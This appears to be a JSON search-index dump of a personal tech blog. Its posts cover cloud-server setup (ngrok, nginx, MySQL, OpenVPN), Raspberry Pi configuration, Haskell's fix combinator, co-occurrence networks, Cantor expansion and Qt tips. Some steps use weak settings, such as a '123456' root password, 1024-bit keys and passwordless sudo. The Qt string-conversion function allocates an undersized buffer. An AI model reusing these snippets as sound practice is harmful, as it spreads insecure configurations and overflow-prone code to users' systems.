assets/client/tls/ngrokroot.crt 编译：sudo make release-server release-client，编译结束后 bin 目录下会有 ngrokd 和 ngrok 两个可执行文件，对应服务器和客户端。 不同系统使用的客户端需要重新编译 windows: sudo GOOS=windows GOARCH=amd64 CGO_ENABLED=0 make release-client arm: sudo GOOS=linux GOARCH=arm CGO_ENABLED=0 make release-client mac: sudo GOOS=darwin GOARCH=amd64 make release-client 设置域名解析，增加记录 A，主机记录为 cross，记录值为云主机公网 IP。 启动服务器，下面命令指定 http 端口映射到 8081，https 映射到 8082。 1./bin/ngrokd -tlsKey=server.key -tlsCrt=server.crt -domain=\"cross.forec.cn\" -httpAddr=\":8081\" -httpsAddr=\":8082\" 域名解析将 http://blog.forec.cn 解析至 https://forec.github.io。 向解析列表添加一条 CNAME 记录，主机记录为 blog，记录值为 forec.github.io。 在 Github 博客仓库中根目录添加一个文件，文件名为 CNAME，文件内容为 blog.forec.cn。 开启 IPv6 新建 /etc/modprobe.d/ipv6.conf，添加 options ipv6 disable=0。 向自启动脚本添加 sysctl -w net.ipv6.conf.all.disable_ipv6=0。 重启，或直接运行上面的命令，观察 ifconfig 结果。 使用 tunnelbroker 分配 IPv6 地址 在 tunnelbroker 注册，并分配一个 tunnel，填入 VPS 外网 IPv4 地址。 在 tunnel 的 example configuration 选项卡下选择 Linux-route2，将生成的脚本拷贝到自启动脚本中。 重启，观察 ifconfig，应增加一个 he-ipv6 网卡，并可看到对应 IPv6 地址。 Nginx 配置 从官网获得 nginx 最新版本链接，wget 到本地 安装编译依赖包： yum -y install zlib zlib-devel openssl openssl--devel pcre pcre-devel 安装 nginx 依赖包：yum install GeoIP gd libXpm libxslt 编译、安装 12345tar -zxvf nginx-1.10.2.tar.gzcd nginx-1.10-2./configuremakemake install /usr/local/nginx/sbin/nginx 运行，在浏览器输入 IP 观察是否显示欢迎页 向 /etc/profile 增加环境变量并 source /etc/profile 更新 12PATH=/usr/local/nginx/sbin:$PATHexport PATH 为 Ngrok 做反向代理 要令 monitor.cross.forec.cn 作为 ngrok 代理，该域名对应的 80 端口转发至本地 9999 端口。在 /usr/local/nginx/conf 增加配置文件 ngrok_monitor.conf。 123456789101112server&#123; listen 80; server_name monitor.cross.forec.cn; location / &#123; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header Host $http_host:8081; proxy_set_header X-Nginx-Proxy true; proxy_set_header Connection \"\"; proxy_pass http://127.0.0.1:9999; &#125;&#125; 安装 MySQL 腾讯云 CentOS 7.2 的 yum 源不提供 mysql-server 下载 mysql 的 repo 源： wget http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpm 安装源： sudo rpm -ivh mysql-community-release-el7-5.noarch.rpm 安装 mysql ：sudo yum install mysql-server 启动 mysqld 服务：systemctl start mysqld.service 修改密码：mysqladmin -u USER -p password PASSWORD 或使用 root 账户登入 mysql，执行 123USE mysql;UPDATE user SET password=PASSWORD('123456') WHERE user='root';FLUSH PRIVILEGES; 开机启动 mysqld 服务：systemctl enable mysqld.service WordPress + Nginx 配置 安装 Mysql、PHP 和 nginx： How To Install Linux, nginx, MySQL, PHP (LEMP) stack on CentOS 6 安装 WordPress 并配置 nginx ：How To Install Wordpress with nginx on CentOS 6 修改静态链接代理：在 wordpress 的 nginx 配置文件中的 locatino / {} 下添加： 123456789if (-f $request_filename/index.html)&#123; rewrite (.*) $1/index.html break;&#125;if (-f $request_filename/index.php)&#123; rewrite (.*) $1/index.php;&#125;if (!-f $request_filename)&#123; rewrite (.*) /index.php;&#125; Nginx HTTPS 配置 安装 openssl 和 openssl-devel：yum install openssl openssl-devel 颁发证书 12345cd /usr/local/nginx/confopenssl genrsa -des3 -out server.key 1024openssl req -new -key server.key -out server.csropenssl rsa -in server.key -out server_nopwd.keyopenssl x509 -req -days 365 -in server.csr -signkey server_nopwd.key -out server.crt 增加配置文件 wordpress_https.conf，除下面部分，其它和 wordpress 配置文件相同 123456server &#123; listen 443; sever_name forec.cn; ssl_certificate /usr/local/nginx/conf/server.crt; ssl_certificate_key /usr/local/nginx/conf/server_nopwd.key;&#125; OpenVPN Server 安装依赖并复制配置 1yum install epel-release&#10;yum install openvpn easy-rsa -y&#10;cp /usr/share/doc/openvpn-*/sample/sample-config-files/server.conf /etc/openvpn 编辑 /etc/openvpn/server.conf 123456dh dh2048.pempush \"redirect-gateway def1 bypass-dhcp\"push \"dhcp-option DNS 8.8.8.8\"push \"dhcp-option DNS 8.8.4.4\"user nobodygroup nobody 复制 rsa 配置 1mkdir -p /etc/openvpn/easy-rsa/keys&#10;cp -rf /usr/share/easy-rsa/2.0/* /etc/openvpn/easy-rsa&#10;cp /etc/openvpn/easy-rsa/openssl-1.0.0.cnf /etc/openvpn/easy-rsa/openssl.cnf 编辑 /etc/openvpn/easy-rsa/vars 12345678910export KEY_COUNTRY=\"US\"export KEY_PROVINCE=\"NY\"export KEY_CITY=\"New York\"export KEY_ORG=\"DigitalOcean\"export KEY_EMAIL=\"sammy@example.com\"export KEY_OU=\"Community\"# X509 Subject Fieldexport KEY_NAME=\"server\"export KEY_CN=openvpn.example.com 创建证书 1cd /etc/openvpn/easy-rsa&#10;source ./vars&#10;./clean-all&#10;./build-ca&#10;./build-key-server server&#10;./build-dh&#10;cd /etc/openvpn/easy-rsa/keys&#10;cp dh2048.pem ca.crt server.crt server.key /etc/openvpn 为客户端创建证书 1cd /etc/openvpn/easy-rsa&#10;./build-key client 设置路由 1yum install iptables-services -y&#10;systemctl mask firewalld&#10;systemctl enable iptables&#10;systemctl stop firewalld&#10;systemctl start iptables&#10;iptables --flush&#10;iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE&#10;iptables-save &#62; /etc/sysconfig/iptables&#10;sed -n &#39;0a net.ipv4.ip_forward = 1&#39; /etc/sysctl.conf&#10;systemctl restart network.service 启动 openvpn 1systemctl -f enable openvpn@server.service&#10;systemctl start openvpn@server.service 配置客户端：将 /etc/openvpn/easy-rsa/keys/ca.crt、/etc/openvpn/easy-rsa/keys/client.crt、/etc/openvpn/easy-rsa/keys/client.key 拷贝到客户机，或者可以将其中的 key 包含到配置文件的 &lt;ca&gt;&lt;/ca&gt;、&lt;cert&gt;&lt;/cert&gt; 和 &lt;key&gt;&lt;/key&gt; 字段中。 创建客户端配置文件 client.ovpn： 12345678910111213clientdev tunproto udpremote your_server_ip 1194resolv-retry infinitenobindpersist-keypersist-tuncomp-lzoverb 3ca /path/to/ca.crtcert /path/to/client.crtkey /path/to/client.key 启动：sudo openvpn --config ~/path/to/client.ovpn 结合客户端／服务器输出的错误信息，对双方配置文件再做调整。 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/11/02/cloud-virtual-machine-config/) 、作者信息（Forec）和本声明。","categories":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}],"tags":[{"name":"CVM","slug":"CVM","permalink":"http://forec.github.io/tags/CVM/"},{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"}],"keywords":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}]},{"title":"Raspberry Pi 3 配置索引","slug":"raspberry-settings","date":"2016-10-29T06:49:23.000Z","updated":"2016-11-12T04:49:34.000Z","comments":true,"path":"2016/10/29/raspberry-settings/","link":"","permalink":"http://forec.github.io/2016/10/29/raspberry-settings/","excerpt":"整理 Raspberry Pi 3 的个人配置。","text":"整理 Raspberry Pi 3 的个人配置。 树莓派及配件型号 树莓派型号：Raspberry Pi 3 Model B , Made in United Kingdom 摄像头型号：1/4 inch OV5647 ，500W 像素，最高帧速 30，视频支持 1080p，made by OmniVision 舵机型号：辉盛 SG90 （2个） 2自由度舵机云台 （1个） RASPBIAN-JESSIE镜像源修改 编辑 /etc/apt/sources.list ，注释原有源 添加 12deb http://mirrors.ustc.edu.cn/raspbian/raspbian/ wheezy main non-free contribdeb-src http://mirrors.ustc.edu.cn/raspbian/raspbian/ wheezy main non-free contrib sudo apt-get update 自启动脚本 向 /etc/rc.local 中写入 su username -c &quot;/path/to/autostart.sh&quot;，autostart.sh 为你编写的自启动脚本。 校园网关登陆 可从我的 Github 托管仓库下载网关登陆 Python 脚本，在自启动脚本中加入 python login.py username passwd，下载地址：https://github.com/Forec/scripts-for-bupt/tree/master/login-bupt-gw。 定时任务 执行 crontab -e 设定定时任务。 /dev/video0 未找到 树莓派的 Camare module 在 /boot/ 目录下以固件形式加载 编辑 /etc/modules-load.d/modules.conf ，文件末尾添加 bcm2835-v4l2。 WiFi 登陆 ifconfig查看是否有 wlan0 sudo nano /etc/network/interfaces 修改文件内容如下： 12345678910auto loiface lo inet loopbackiface eth0 inet dhcpauto wlan0allow-hotplug wlan0iface wlan0 inet dhcpwpa-ssid \"ssid_name\"wpa-psk \"password\" sudo /etc/init.d/networking restart 重启网络 修改默认账号 pi sudo raspi-config 启动 VNC 启用 root 账号 12sudo passwd rootsudo passwd --unlock root 重启后以 root 登陆（从 VNC 登陆） 修改用户名 pi 为 username：usermod -l username pi 修改组名 pi 为 username：groupmod -n username pi 更改 pi 的家目录为 username 家目录：mv /home/pi /home/username 修改 /etc/passwd 中 username 用户的家目录地址：usermod -d /home/username username 编辑 /etc/sudoers，修改末尾的 pi ALL=(ALL) NOPASSWD: ALL 为 username ALL=(ALL) NOPASSWD: ALL 重新锁定 root：passwd -l root 以新用户 ssh 登陆并尝试 sudo Motion 配置 编辑 /etc/motion/motion.conf ，修改以下项： daemon : 修改为 on，使 motion 以守护进程方式运行 width : 修改为 1024 height : 修改为 768 framerate ： 修改为 24 output_normal：修改为 off（在检测到运动时不截图，若想记录则保持 on） ffmpeg_video_codec ： 修改为 mpeg4 control_localhost ： 修改为 off，允许远程修改配置 control_authentication ： 为远程操控配置设置认证信息 webcam_localhost ： 允许远程访问监控流 webcam_motion：修改为 on，仅在检测到运动时增加帧速 webcam_maxrate：修改为远程监控需要的帧速 编辑 /etc/defaults/motion，将 start_motion_daemon 修改为 yes，设置为开机启动 创建 /var/run/motion 文件夹 在家目录下 创建 .motion 文件夹 cp /etc/motion/motion.conf ~/.motion/ 修改配置权限为非 root 用户：sudo chown forec:forec ~/.motion/motion.conf VNC 分辨率调整 在自启动脚本中加入 vncserver -geometry widthxheight :1，将分辨率设置为 width × height，通过 address:1 访问。 vncpasswd 修改密码 mstsc 访问 安装 xrdp SSH 公钥登陆 ssh-copy-id user@host ，将本地公钥上传到树莓派。 内网穿透 使用 ngrok 将内网端口映射到固定域名。将在云主机编译好的 arm 版本 ngrok 拷贝到树莓派。 新建一个配置文件ngrok.cfg。我为内网穿透服务设置的网址为 cross.forec.cn，云主机上 ngrok 服务器设置的监听端口为 4443，remote_port选项对 tcp 有效，指定映射后的云主机的端口。 12345678910111213141516server_addr: cross.forec.cn:4443trust_host_root_certs: falsetunnels: ssh: proto: tcp: 22 remote_port: **** vnc: proto: tcp: 5091 remote_port: **** monitor: auth: \"username:password\" proto: tcp: 8081 remote_port: **** 编写启动脚本 run.sh。上面的配置文件设置了三个端口映射方案，在启动时 start 三个方案。 1sudo /path/to/ngrok --config=\"/path/to/ngrok.cfg\" start ssh vnc monitor 将 run.sh 脚本加入 autostart.sh。 音频播放 sudo apt-get install alsa-utils 可播放 wav 格式，测试：sudo aplay /usr/share/sounds/alsa/Front_Center.wav 使用 alsamixer 调整音量 sudo apt-get -y install mpg321 使用 mpg321 可播放 mp3 格式音频 驱动 SG90 舵机 从 此处 下载树莓派 GPIO 管脚驱动 ServoBlaster cd ServoBlaster/user 并 make servod ./servod，成功将展示对应管脚脉冲对应情况 如 SG90 舵机脉冲输入管脚为 GPIO17，可使用 echo 1=180 &gt; /dev/servoblaster 使其转动 可使用 2 个 9g 舵机组成二自由度舵机云台，使摄像头横向 180 度，纵向 120 度旋转 舵机黄色线为信号输入，棕色线接 GND，红色线接 5V 树莓派 GPIO 管脚如下 可编写脚本驱动舵机在两个方向上旋转，拍摄视频可在我的官方网站查看：http://forec.cn/2016/11/12/drive-servo-by-raspberry-pi/。 Ubuntu-mate 无屏幕暂时无法尝试 扩展文件系统 sudo fdisk /dev/mmcblk0 按序输入 d Enter 2 Enter n Enter p Enter 2 重启 sudo resize2fs /dev/mmcblk0p2 重启 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/10/29/raspberry-settings/) 、作者信息（Forec）和本声明。","categories":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}],"tags":[{"name":"Mistakes","slug":"Mistakes","permalink":"http://forec.github.io/tags/Mistakes/"},{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"},{"name":"Raspberry","slug":"Raspberry","permalink":"http://forec.github.io/tags/Raspberry/"}],"keywords":[{"name":"Configuration","slug":"Configuration","permalink":"http://forec.github.io/categories/Configuration/"}]},{"title":"Fix in Haskell","slug":"haskell-fixit","date":"2016-10-08T06:48:19.000Z","updated":"2016-11-18T12:23:14.000Z","comments":true,"path":"2016/10/08/haskell-fixit/","link":"","permalink":"http://forec.github.io/2016/10/08/haskell-fixit/","excerpt":"There’re many interesting features in Haskell, here I want to introduce and analyse the Fixed-point combinator, which spent me several hours understanding but only scratched the surface.","text":"There’re many interesting features in Haskell, here I want to introduce and analyse the Fixed-point combinator, which spent me several hours understanding but only scratched the surface. Definition Of Fix You can find the definition of Fix function in wiki. The definition is 12fix :: (a -&gt; a) -&gt; afix f = let x = f x in x Fix And Recursion It seems a little confused. What does let x = f x in x mean? For example, GNU is GNU is not Unix, so how could you expand GNU? GNU GNU GNU ... GNU is not Unix? Another example, let x = (1:) x in x, what will x like? A list of infinite 1. Still confused? You can try let x = x + 2 in x, this will cause an exception because of stack overflow. The reason is that the (+2) operation is expanded constantly. So what is fix exactly? Fix can be imported from Control.Monad.Fix, its definition has been given above. Now we can learn the power of Fix from an example. The fact is used to calculate factorial, here we calculate 5!. There are two kind of implements, the first is common recursion, like first line below. Instead, we can use Fix to rewrite it. We pass a lambda function to fix as a parameter, the lambda function receives rec and n as parameters, rec here is abstracted and it was initialized by if n == 0 then 1, this is indeed initialized for the lambda function, however you can think it as an anonymous rec. 1234Prelude&gt; let fact n = if n == 0 then 1 else n * fact (n-1) in fact 5120Prelude&gt; fix (\\rec n -&gt; if n == 0 then 1 else n * rec (n-1)) 5120 In fact, from the definition of Fix, we know that fix means a fixed-point. What we need to do is to write the equation for fix like below. Fix is used to find a fixed-point for given function. 1f (fix f) = fix f So why fix (+2) is getting an exception? There is no x for x == x + 2, so fix cannot find an fixed-point for (+2). That’s why fix finally came into stack overflow. Now we are going to learn what fix works in details. We can expand fix like below. 1234567891011fix (2+)= 2 + (fix (2+))= 2 + (2 + fix (2+))= 2 + (2 + (2 + fix (2+)))= 2 + (2 + (2 + (2 + fix (2+))))= ...fix (1:)= 1 : fix (1:)= 1 : (1 : fix (1:))= 1 : (1 : (1 : fix (1:))) As you can see, fix (1:) can work fine since the lazy evaluation of Haskell. If we pass fix (1:) to show, GHCI can still work and output [1, 1, 1, .... Return to the fact example now, how does it work? We write that lambda function passed to fix as a named function fact&#39; here, the definition is fact&#39; rec n = if n == 0 then 1 else n * rec (n-1). Pass this to fix, fix will find a fixed-point of fact&#39;, which is the function f such that f == fact&#39; f. So we can write fact&#39; like below. 12f = fact' f = \\n -&gt; if n == 0 then 1 else n * f (n-1) Are you familiar with the equation above? The f substitute rec in fact&#39;, and f also acts as fact&#39; f, which is just recursion. So expand fix as we always did. (Codes below are copied from wiki) 1234567891011121314fix fact'= fact' (fix fact')= (\\rec n -&gt; if n == 0 then 1 else n * rec (n-1)) (fix fact')= \\n -&gt; if n == 0 then 1 else n * fix fact' (n-1)= \\n -&gt; if n == 0 then 1 else n * fact' (fix fact') (n-1)= \\n -&gt; if n == 0 then 1 else n * (\\rec n' -&gt; if n' == 0 then 1 else n' * rec (n'-1)) (fix fact') (n-1)= \\n -&gt; if n == 0 then 1 else n * (if n-1 == 0 then 1 else (n-1) * fix fact' (n-2))= \\n -&gt; if n == 0 then 1 else n * (if n-1 == 0 then 1 else (n-1) * (if n-2 == 0 then 1 else (n-2) * fix fact' (n-3)))= ... Implementation Of Foldr &amp; Reverse I am going to show some of the applications of fix. First is reverse. We can write reverse&#39; as the parameter of fix. The type system of reverse&#39; is ([a] -&gt;[a]) -&gt; ([a] -&gt; [a]). Notice that I use a pair of parentheses out of [a] -&gt; [a], that’s because curry. reverse&#39; is just like fact&#39;, it receives a function f, and fix is going to find a f which satisfies f = reverse&#39; f. Now we can easily write reverse&#39; below. 12345678910111213reverse' :: ([a] -&gt; [a]) -&gt; ([a] -&gt; [a])reverse' f [] = []reverse' f (x:xs) = f xs ++ [x]reverse = fix reverse'-- expand the definition above(fix reverse') [1,2,3]= (reverse' (fix reverse')) [1,2,3]= (reverse' f) [1,2,3]= f [2,3] ++ [1]= (reverse' f) [2,3] ++ [1]= ... Another example I am going to talk is foldr. I found the kata about fix in Codewars, you can see it here. I didn’t pass the time limitation, and finally I got clues from conversations. There are several ways to write foldr by fix, however, you need to maintain the feature of foldr, the lazy evaluation. I will show two of them both satisfying the lazy evaluation. 123456789foldr' :: ((a -&gt;b -&gt;b) -&gt;b -&gt;[a] -&gt;b) -&gt;((a -&gt;b -&gt;b) -&gt;b -&gt;[a] -&gt;b)foldr' f g acc [] = accfoldr' f g acc (x:xs) = f g (g x acc) xsfoldr' :: ((a -&gt;b -&gt;b) -&gt;b -&gt;[a] -&gt;b) -&gt;((a -&gt;b-&gt; b) -&gt;b -&gt;[a] -&gt;b)foldr' f g acc [] = accfoldr' f g acc (x:xs) = g x (f g acc xs)foldr = fix foldr' Which is better? In my own opinion, the first is better since it is written in a format of tail-end recursion. This would not expand the stack space it used. However, the second needs to expand until the end of the list. But, after my experiment testing big integers, both of them met stack overflow at the same size while works as same as each other when they can deal with the parameters. This proved that my thought was wrong. So, why the two formats have same performance? Stay for thought. I hope this article could give you some help. If this article has any error, or you have some problems/suggestions, please e-mail me. I am glad to learn from each other. 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/10/08/haskell-fixit/) 、作者信息（Forec）和本声明。","categories":[{"name":"Language","slug":"Language","permalink":"http://forec.github.io/categories/Language/"}],"tags":[{"name":"Haskell","slug":"Haskell","permalink":"http://forec.github.io/tags/Haskell/"},{"name":"函数式编程","slug":"函数式编程","permalink":"http://forec.github.io/tags/函数式编程/"}],"keywords":[{"name":"Language","slug":"Language","permalink":"http://forec.github.io/categories/Language/"}]},{"title":"Network Mining Based On Co-occurrence","slug":"co-occurrence-structure-capture","date":"2016-10-03T14:16:16.000Z","updated":"2017-08-22T07:29:36.000Z","comments":true,"path":"2016/10/03/co-occurrence-structure-capture/","link":"","permalink":"http://forec.github.io/2016/10/03/co-occurrence-structure-capture/","excerpt":"Generate network based on co-occurrence was proposed several decades ago, however, it still occupies most of papers talking about network discovering. Here I want to give a simple introduction for network capture by conventional co-occurrence methods. The following contents are slightly related with the basis of my current work, they are out of date but still useful sometimes.","text":"Generate network based on co-occurrence was proposed several decades ago, however, it still occupies most of papers talking about network discovering. Here I want to give a simple introduction for network capture by conventional co-occurrence methods. The following contents are slightly related with the basis of my current work, they are out of date but still useful sometimes. General Introduction This article is just an introduction for several methods capturing useful structured data from unstructured data sets. It only talks about the basic implementation of co-occurrence in text data. After reading this short article, you will know how to generate a graph as follows from a paragraph of text, a set of Internet data captured from spiders or even a video. An example, the following picture is generated from a part of the script of 《Train to Busan》. I copied the script from Internet, and it’s easy to be analyzed by code. The picture was cut a little part when I published it. Entity Identification A network is composed of a set of nodes and a set of edges. We name the set of nodes V, and edges E. The first problem we face is where can we get V. Entity identification needs to be considered here. Some simple methods such as regress( for binary classification ), SVM can be used if you know the characteristics for nodes. However, in most conditions we even can’t describe what the nodes exactly like. In these conditions, deep learning algorithms such as Convolutional Neural Network could be considered. You can give some nodes you already know, then ask your model to learn what the nodes like. That may be a little complex, so we left them behind. Here we just consider the best condition. Here we make a hypothesis, you already have the set of all the nodes. That means, you have the V and the data set, what you need to do is just generating a network for the V from the given data set. Sounds simple? However this is indeed the case. In some few cases, for example, generating network from a movie like the example above, very few main entities appear in a movie, so we can get their identifications (here is name) from web or just make them yourself. Relationship Identification Here we come across the second question, how to get E? I will only introduce one simple method here, that’s what I metioned above, the conventional co-occurrence method. I will introduce some more methods after my current job finished. The co-occurrence network, is just like what its name suggests, use the information that two entities occurred together. For example, in my analysis for 《Train to Busan》, I simply build an edge for two nodes if they occur in a same paragraph. If there always been an edge for two nodes, the weight of that edge will be increased. Once the data set is big enough, the main line of the data set will appear. You can choose building directed edges or undirected edges, and choose complete graph or not. The co-occurrence network is only useful for data sets that have obvious centralization, edges with low weight are always redundant. Also, many nodes will have no sense of presence because they are just playing samll roles. The co-occurrence will make every node connect with the center node, that’s unreasonable. Since we just introduce the very simple condition here, I will present two common ways for reducing the redundancy ans and [thanks for a kind reader, he pointed out the mistake here] fixing the network. The first way is filter. Easy to understand, just filter out those edges with low weight. The threshold can be adjusted manually or learned by specific models. The second way is segmenting your network. This needs clustering first, and find the community centers. Cut these edges connecting with center nodes but has low weights. The effect is hard to be estimated according to what your network structure likes. Applicable Scope Many fields can be applied with co-occurrence method. For example, capturing people relationships from videos, recodings, pictures, etc. I will show how to generate a network from a video later. That will cost a long time since many frame needs to be considered, which is a very time-consuming job. I hope this article could give you some help. If this article has any error, or you have some problems/suggestions, please e-mail me. I am glad to learn from each other. Related Data Download Link： Script for 《Train to Busan》 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/10/03/co-occurrence-structure-capture/) 、作者信息（Forec）和本声明。","categories":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"},{"name":"图分割","slug":"图分割","permalink":"http://forec.github.io/tags/图分割/"},{"name":"机器学习","slug":"机器学习","permalink":"http://forec.github.io/tags/机器学习/"}],"keywords":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}]},{"title":"Cantor Expansion With Duplicate Elements","slug":"duplicate-cantor","date":"2016-09-27T14:34:03.000Z","updated":"2017-02-01T06:58:24.000Z","comments":true,"path":"2016/09/27/duplicate-cantor/","link":"","permalink":"http://forec.github.io/2016/09/27/duplicate-cantor/","excerpt":"Cantor Expansion is simple, however, for permutations with duplicate elements, some factors are changed.For why I use English: Since I am going to write an English paper, I want to write several articles in English here for practice. Please forgive me for any inconvenience I may have caused to you.","text":"Cantor Expansion is simple, however, for permutations with duplicate elements, some factors are changed.For why I use English: Since I am going to write an English paper, I want to write several articles in English here for practice. Please forgive me for any inconvenience I may have caused to you. Basic Cantor ExpansionCantor Expansion A permutation without duplicate elements can have a mapping with a sequence [1..n], for example, think about 2134, a permutation of {1, 2, 3, 4}. To calculate the position of 2134 in all permutations of {1, 2, 3, 4}, we can follow the steps: Pos = 1 * 3! + 0 * 2! + 0 * 1! = 6. The explanation is, since there’s only one element 1 in elements behind 2 and smaller than 2, if we swap 1 and 2, there will be 3! permutations smaller than 2134. Similiar to this, no elements smaller than 1, 3 and 4. So the related number with 2134 is 6. In C++, we can define a function named perm2num, generate the position of a given permutation. 1234567891011/* n is the number of elements, p is the set of elements */int perm2num(int n, int *p)&#123; int num = 0, add = 1; for (int i = n - 2; i &gt;= 0; i--)&#123; for (int j = i + 1; j &lt; n; j++) if ( p[j] &lt; p[i] ) num += add; add *= (n - i); &#125; return num; &#125; Cantor Inverse To generate a permutation from the position it stays in, we can follow a reverse of the upper step. The C++ code is just the reverse operation of perm2num. 12345678910void num2perm(int n, int *p, int num)&#123; for (int i = n - 1; i &gt;= 0; i--)&#123; p[i] = num % ( n - i ); num /= (n - i); &#125; for (int i = n - 1; i &gt;= 0; i--) for (int j = i - 1; j &gt;= 0; j--) if ( p[j] &lt;= p[i] ) p[i]++;&#125; With Duplicate Elements To generate the position of a permutation with duplicate elements, two factors influenced. First, when calculate the possible increase for element p[i], in basic cantor expansion, we need to find how many elements are smaller than p[i] and behind p[i], and multiply this number with (n - i)!. Now, we need to divide this by the product of some factorials, which are how many elements are duplicate behind p[i]. For example, BABA, to calculate the increase for first B, 2 elements, both are A, are smaller than B. In basic Cantor Expansion, it should be 2 * 3!, now we need to divide it by 2! * 1!. The 2! is from 2 B after swapping, and 1! if from one A after swapping. Second, if one element y has been used in calculating an increase for element p[i], y should only be counted once. For example, BABA only adds 2 * 3! / 2! once. I want to recommand a website https://www.codewars.com here. My username in that website is Forec, you can find me here. I was inspired by one kata in that website, and that reminds me of cantor expansion. You can find the kata here. I didn’t find any articles talking about duplicate condition. I wish this can help you. 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/09/27/duplicate-cantor/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"Qt msvc2013 问题解决方案","slug":"tips-for-qt","date":"2016-09-14T02:36:35.000Z","updated":"2016-11-08T11:17:52.000Z","comments":true,"path":"2016/09/14/tips-for-qt/","link":"","permalink":"http://forec.github.io/2016/09/14/tips-for-qt/","excerpt":"编写 Remote-Control 的客户端代码，界面用Qt绘制，记录出现的问题及解决方案。","text":"编写 Remote-Control 的客户端代码，界面用Qt绘制，记录出现的问题及解决方案。 MSVC的Release问题 使用Qt版本5.6.0， msvc2013。Release后缺少动态链接库。 msvc2013 的 bin 目录下没有 mingwm10.dll、libgcc_s_dw2-1.dll等。 在 main() 函数顶部添加 QCoreApplication::addLibraryPath(&quot;./&quot;); 将release出的 app.exe 拷贝到部署文件夹，path_to_msvc2013\\bin\\windeployqt.exe app.exe。 可能仍出现 无法定位动态链接库 Qt5Widgets.dll。环境变量中有 MikTex 的路径，该路径下包含 Qt5Widgets.dll， 将 msvc2013 在环境变量中的位置调整高于 MikTex。 或在部署文件夹下新建 qt.conf，指定 Library 加载目录。 部署程序图标 程序图标 icon.ico 在工程目录下 （与project.pro同目录）新建 icon.rc，添加 IDI_ICON1 ICON DISCARDABLE &quot;icon.ico&quot; 在 project.pro 中添加 RC_FILE = icon.rc release可执行文件 宽字符转换 执行 ShellExecute() 函数时，参数 3 需要宽字符。 ShellExecute(NULL, L&quot;open&quot;, open_file_path, NULL , NULL, SW_SHOWNORMAL); 编写函数 string2LPCWSTR 将 std::string 转为 LPCWSTR。 1234567inline LPCWSTR stringToLPCWSTR(std::string src)&#123; size_t srcsize = src.length() + 1; size_t convertedChars = 0; wchar_t *wcstring = (wchar_t *)malloc(sizeof(wchar_t)*(src.length()-1)); mbstowcs_s(&amp;convertedChars, wcstring, srcsize, src.c_str(), _TRUNCATE); return wcstring;&#125; Qt下UTF8和GBK的转换 UTF82GBK 123456inline QString UTF82GBK(const QString &amp;inStr)&#123; QTextCodec *gbk = QTextCodec::codecForName(\"GB18030\"); QString u2g = gbk-&gt;toUnicode(inStr.toLocal8Bit()); return u2g;&#125; GBK2UTF8 123456inline QString GBK2UTF8(const QString &amp;inStr)&#123; QTextCodec *gbk = QTextCodec::codecForName(\"GB18030\"); QString g2u = gbk-&gt;toUnicode(gbk-&gt;fromUnicode(inStr)); return g2u;&#125; Qt下线程和ui组件处理 编写线程子函数 unsigned int __stdcall refreshThread(void* pM)，试图在子线程中修改ui组件 handle = (HANDLE)_beginthreadex(NULL, 0, refreshThread, (void *)(&amp;actives[i]), 0,NULL ); 参数 3 不能是非静态成员函数 Qt中只有 QApplication.exec() 主线程能对界面元素进行控制 利用 signal/slot，在线程中创建一个 signal，在主线程中创建一个 slot。当线程修改界面时，发送 signal 通知主线程响应。 Qt的Sql操作 QSqlDatabase db = QSqlDatabase::addDatabase(&quot;QSQLITE&quot;); 添加 sqlite，可添加第二个参数指定当前连接名称，未指定该参数则为默认连接 db.setDatabaseName(&quot;data.db&quot;); 指定数据库文件 query = QSqlQuery(db); 创建查询 query.exec(&quot;&quot;); 执行sql语句 添加多个数据库时，addDatabase必须指定不同的连接名称，否则会覆盖默认连接或重名连接引发错误。 Socket通信频率问题 使用同一个 buf 作为发送方的缓冲，当 buf长度过大，超过 Socket默认缓冲长度时，如果发送频率过快，socket的拆分发送将使 buf 同时读写，接收方将收到垃圾数据。 send 返回实际写入的字节数，检查发送的数目并移动缓冲窗口，结尾判断可以用字节填充。 或缩小 buf 长度，但网络情况差的时候仍会写入垃圾数据，只是垃圾数据较少。传输二进制文件将因为垃圾数据的存在而无效。 一些组件的tips 添加 QTableWidget 右键菜单 123456789ui-&gt;tableWidget-&gt;setContextMenuPolicy(Qt::CustomContextMenu);popMenu = new QMenu(ui-&gt;tableWidget);action = new QAction(\"connect\",this);void MainWindow::on_tableWidget_customContextMenuRequested(const QPoint &amp;pos)&#123; popMenu-&gt;clear(); // popMenu for QTableWidget popMenu-&gt;addAction(action); // action for connect popMenu-&gt;exec(QCursor::pos());&#125; 滚动条位置设置 123QTextEdit *edit = ui-&gt;textEdit; // example for QTextEditQScrollBar *sb = edit-&gt;verticalScrollBar();sb-&gt;setValue(sb-&gt;maximumHeight()); Qt正则 12345QString 